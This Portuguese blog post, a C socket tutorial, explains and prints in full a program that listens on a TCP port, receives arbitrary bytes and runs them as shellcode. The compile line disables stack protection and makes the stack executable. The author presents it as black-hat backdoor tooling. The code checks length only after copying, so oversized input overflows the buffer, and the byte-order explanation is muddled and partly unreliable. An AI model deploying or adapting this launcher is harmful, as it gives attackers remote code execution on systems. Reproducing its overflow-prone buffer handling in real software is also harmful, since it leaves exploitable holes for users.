---
layout: post
title: Socket Criando Shellcode Remote exec 0xc4
categories: [c programming]
tags: [shellcode remote, linux,execute]
fullview: true
comments: true
---
<p>Novamente volto a falar, meu parceiro tudo que diz respeito a C com socket para Unix, vai ser bem vindo para nós. O grande lance é ganhar a lógica em Unix já que em windows a coisa muda um pouco porque vamos usar API, tudo no windows são as API's, até quando começamos a aprender assembly vamos dar uma passadinha por windows e vamos ver muita coisa sobre ela, mas no momento vamos continuar com nosso UNix :D; precisamos entender a fundo pois depois vamos apender a 'codar' do zero um socket PNET lol level total. Let's Gooooo: Na verdade esse artigo vai ser um complemento de um video meu não deu pra explicar tudo no video questão de tempo parceiro. Fiz o video para demostrar e acabei dando uma passada rápida no código em C, expliquei tudo de python, mas não em C vamos agora entender. #partiu</p>
<p>O foco aqui é C, outras coisas já vai da pra entender no video. só pra deixar bem claro  no video falo que os creditos não são meus já que o 'Vivik' que criou o script,eu já tinha feito algum parecido em Python como falei no video "como fazer um backdoor em python", que há uma possibilidade injetar um shellcode na memória. Agora vamos para o artigo, não vou falar dos Hearders já falei nos artigos passado não muda nada e também usa o google parceiro :D é uma ferramenta impressionante. então vai ai</p>
{% highlight c++ %}
//tirem os espaços das bibliotecas :D, é que da uns bug quando deixo com sem eles
#include< stdio.h >
#include< stdlib.h >
#include< sys/socket.h >
#include< sys/types.h >
#include< error.h >
#include< strings.h >
#include< unistd.h >
#include< string.h >
#include< arpa/inet.h >
{% endhighlight %}
<p>já que estou usando o a biblioteca 'error.h' como citei em um artigo passado fica mais dinâmico, também é questão de deixar as coisas mais profissionais :D coisa de programadores; string.h pois vamos usar o shellcode é ele nada mais é que uma string só que em Hexadecimal, as demais já são conhecida então vamos continuar :p.</p>
{% highlight c++ %}
#define ERROR	-1
#define MAX_DATA	2048
#define MAX_SHELLCODE_LEN	4096

char shellcode[MAX_SHELLCODE_LEN];
{% endhighlight  %}
<p>Essas linhas acima também né ? define se nossa comunicação voltar -1 claro da um erro, e define tanho do máximo de dados e tamanho máximo do shellcode. isso é muito simples logo abaixo vai ficar tudo claro. As linhas que vem agora são totalmente conhecida por você lembra do outro artigo, falamos sobre a mesma e espero que tenha compreendido a função de cada uma mesmo assim vou comentar cada linha há vai assim mesmo vamos entender tudo novamente.</p>
{% highlight c++ %}
main(int argc, char **argv)
{
	struct sockaddr_in server; // estrutura server
	struct sockaddr_in client; // estrutura cliente
	int sock; // criar do descritor
	int new; //segundo descritor
	int sockaddr_len = sizeof(struct sockaddr_in); // tamanho da estrutura
	int data_len, shellcode_len; // variáveis de controle de dados
	char data[MAX_DATA]; // string com 2048 bytes
	int (*fptr)(); // ponteiro que no final vai entender o porque :D
{% endhighlight  %}
<p>Tá no Ponto ? all right, então agora precisamos criar nosso socket e definir as struct com o protocolo e família. vamos definir a famíla AF_INET, claro já sabemos TCP. a porta htons(atoi(argv[1]));, que vai receber o argumento 1, outra coisa eu nunca vi alguém falar o porque 'htons' eu acho que nego que nunca usou o PE, ai não sabe pra que serve é melhor entender agora logo o bom que já fica na mente quando falarmos dela futuramente, para entender melhor precisamos saber que estamos trabalhando com socket camada, é preciso converter o número da porta para <a>big endian</a>, eu falei sobre big endian na saga sobre desenvolvimento de exploit, mas como vamos usar futuramente em assembly, então vou explicar logo não é complicado, vamos lá: relacionado ao processador ele copia os dados para stack em little endian(ao contrário), mas lembre-se ele copia os dados bytes a bytes  funciona tipo assim;</p>
<pre class="code">
---------------------------------------------
(Big endian)-[enpurra-]------->AB CD EF GH IJ  
=============================================
                                            |
                                            |
---------------------------------------------
Stack (little endian)<-----[recebe]----------  
---------------------------------------------
                   |
                   | Etapa 2 em ação
                   |
                   v
---------------------------------------------
(Big endian)-[enpurra-]---------->AB CD EF GH IJ  {IJ cai}
=============================================  |
                                            |  |
                                            |  |
---------------------------------------------  v
Stack (little endian)<-----[recebe]---------- [IJ] assim vai com todos os bytes
---------------------------------------------
                   |
                   | Etapa 3 em ação[dados copiados]
                   |
                   v
---------------------------------------------
(BE)-[enpurra-]----------------------------->    
=============================================  |
                                            |  |
                                            |  |
---------------------------------------------  v
Stack LE[recebe]----[IJ][GH][EF][CD][AB]-----
---------------------------------------------
</pre>
<p>Depois o processador que se vira para trazer os valores do jeito normal, assim vai ser quando usamos uma API em assembly futuramente, em socket como os dados vai ser estruturados e envelopados no pacote é preciso usar a htois para converter esses inteiro para big endian, 'Network Byte Orders' todos os computadores usam bytes na mesma ordem, e só tem duas maneiras de armazenar esse bytes ou em little endian ou big endian Assim que as máquinas com diferentes convenções de ordem de bytes podem se comunicar, os protocolos de Internet especificar uma convenção byte ordem canônica para os dados transmitidos através da rede. Isto é conhecido como Network Byte Order.

Ao estabelecer uma conexão de soquete Internet, você deve se certificar de que os dados no sin_port e membros sin_addr da estrutura sockaddr_in são representados em Network Byte Order. Vai ai uma tabela das funções:</p>
<pre class=code>
Função	Descrição
htons ()	Host para Rede Curto
htonl ()	Host para rede de longa
ntohl ()	Rede de host longo
ntohs ()	Rede para o Host Curto
</pre>
<pre>
Aqui está mais detalhes destas funções:

htons curto não assinado (não assinado curto hostshort)
Esta função converte (2 bytes) As quantidades de 16 bits da ordem de byte do host para a rede byte ordem.

htonl longo não assinado (hostlong longo não assinado)
Esta função converte (4 bytes) quantidades de 32 bits da ordem de byte do host para a rede byte ordem.

ntohs curtos sem sinal (unsigned short netshort)
Esta função converte (2 bytes) As quantidades de 16 bits a partir da ordem de bytes da rede para hospedar byte ordem.

ntohl longo não assinado (netlong longo não assinado)
Esta função converte quantidades de 32 bits a partir da ordem de bytes da rede para hospedar byte ordem.
</pre>
<p>
Estas funções são macros e resultam na inserção do código de fonte de conversão para o programa de chamada. Nas máquinas little-endian o código irá alterar os valores em torno de rede byte ordem. Em máquinas big-endian nenhum código é inserido uma vez que nenhum é necessário; as funções são definidas como nulo. eheheh faz parte aprender como as coisas funciona isso não é perca de tempo, vai ti ajudar meu amigo lá na frente, eu aposto que muitos programadores não sabem bulhufas de rede ai quando vai criar uma aplicação que usa rede pronto começa a dor de cabeça.</p>
{% highlight c++ %}
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
	{
		perror("server socket: ");
		exit(-1);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8); // preenche a estrura
{% endhighlight %}
<p>Eu não vejo nenhuma razão para preferir bzero sobre memset, memset é uma função C padrão, enquanto bzero nunca foi uma função C padrão. O raciocínio é provavelmente porque você pode conseguir exatamente a mesma funcionalidade usando memset função de ter diferença tem mas não vai mudar em nada. </p>
{% highlight c++ %}
if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(-1);
	}

	if((listen(sock, 1)) == ERROR)
	{
		perror("listen");
		exit(-1);
	}

	if((new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)) == ERROR)
	{
		perror("accept");
		exit(-1);
	}

{% endhighlight  %}
<p> olhe que estamos usando a função perror é melhor pra tratar erro do que ficar dando printf.</p>
{% highlight c++ %}
data_len = shellcode_len = 0;

	do
	{
		data_len = recv(new, data, MAX_DATA, 0);

		if(data_len)
		{
			memcpy(&shellcode[shellcode_len], data, data_len);
			shellcode_len += data_len;
			if (shellcode_len > MAX_SHELLCODE_LEN)
			{
				printf("Received shellcode length exceeds MAX_SHELLCODE_LEN: exiting!\n");
				exit(-1);
			}

		}
{% endhighlight  %}
<p>Ai também é muito simples, entra em um do-while, a função recv() que é do header  <a>sys/socket.h</a>, do ingles Receiving Data, o nome já diz ela fica esperando os seguintes parâmetros  recv (int socket, void *buffer, size_t size, int flags),  função deve receber uma mensagem de um soquete de conexão de modo ou de modo de conexão. É normalmente usado com sockets conectados porque não permite que o aplicativo para recuperar o endereço de origem de dados recebidos. Após a conclusão, recv () deve retornar o comprimento da mensagem em bytes. Se nenhuma mensagem estiver disponível para ser recebido e os pares tem realizado um desligamento ordenado, recv () deve retornar 0. Caso contrário, -1 será devolvido e errno definida para indicar o erro. logo em seguida vem coisa básico de C memcpy explicando vai memcpy (destino, origem, sizeof (destino)); em outras palavras eu copio o send() enviado pelo cliente para a variável shellcode, e comparo o tamanho do shellcode é maior que nossa variável tamanho máximo, se for maior eu sair fora do programa, é um simples tratamento  há o video vou colocar logo em baixo não se preocupe. vamos continuar  </p>
{% highlight c++ %}
}while(data_len);


	close(new);
	close(sock);

	if(shellcode_len)
	{

		printf("Shellcode size: %d\n", (int)strlen(shellcode));
		printf("Executing ...\n");
		fptr = (int(*)())shellcode;
		(int)(*fptr)();

	}

	return 0;		
}
{% endhighlight  %}
<p>Agora se a variável data_len tiver algum dentor dela for diferente de 0, vou fechar os socket's já que não vamos usa-lo o resto agora é simples, tenho se tiver alguma coisa na variável do tamanho do shellcode, ai é só criar um ponteiro uma locação na memoria e depois direciono o nosso shellcode pro mesmo por isso definir int (*fptr) o asterico indica uma criação de um ponteiro, acho que você já sabia disso então isso é tudo pessoal.:D agora ficou bem explicado acho que fosse explicar isso tudo no video ficaria uma bosta 50 min, se eu fazer mais video vou deixa-lo bem curto e no artigo eu explico melhor agora sim, em muleque(a) ta virando black hat em C, falei que dava pra fazer muita coisa usando socket. até o próximo. fique com o código completo:</p>
{% highlight c++ %}
/*
  RemoteShellcodeLauncher.c
	Author: Vivek Ramachandran
	Email: vivek@securitytube.net

	License: Use as you please for both commercial/non-commercial with/without attribution

	Website: http://securitytube.net

	Infosec Training: http://SecurityTube-Training.com
	Checkout our Assembly Language and Shellcoding course!

	Disclaimer: Written in 30 mins by salvaging my old code, might be prone to error. Please fix yourself :)

	Compile: gcc RemoteShellcodeLauncher.c -z execstack -fno-stack-protector -o RemoteShellcodeLauncher

*/



#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<string.h>
#include<arpa/inet.h>

#define ERROR	-1
#define MAX_DATA	2048
#define MAX_SHELLCODE_LEN	4096

char shellcode[MAX_SHELLCODE_LEN];

main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sock;
	int new;
	int sockaddr_len = sizeof(struct sockaddr_in);
	int data_len, shellcode_len;
	char data[MAX_DATA];
	int (*fptr)();

	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
	{
		perror("server socket: ");
		exit(-1);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8);

	if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(-1);
	}

	if((listen(sock, 1)) == ERROR)
	{
		perror("listen");
		exit(-1);
	}

	if((new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)) == ERROR)
	{
		perror("accept");
		exit(-1);
	}


	data_len = shellcode_len = 0;

	do
	{
		data_len = recv(new, data, MAX_DATA, 0);

		if(data_len)
		{
			memcpy(&shellcode[shellcode_len], data, data_len);
			shellcode_len += data_len;
			if (shellcode_len > MAX_SHELLCODE_LEN)
			{
				printf("Received shellcode length exceeds MAX_SHELLCODE_LEN: exiting!\n");
				exit(-1);
			}

		}

	}while(data_len);


	close(new);
	close(sock);

	if(shellcode_len)
	{

		printf("Shellcode size: %d\n", (int)strlen(shellcode));
		printf("Executing ...\n");
		fptr = (int(*)())shellcode;
		(int)(*fptr)();

	}

	return 0;		
}

{% endhighlight  %}
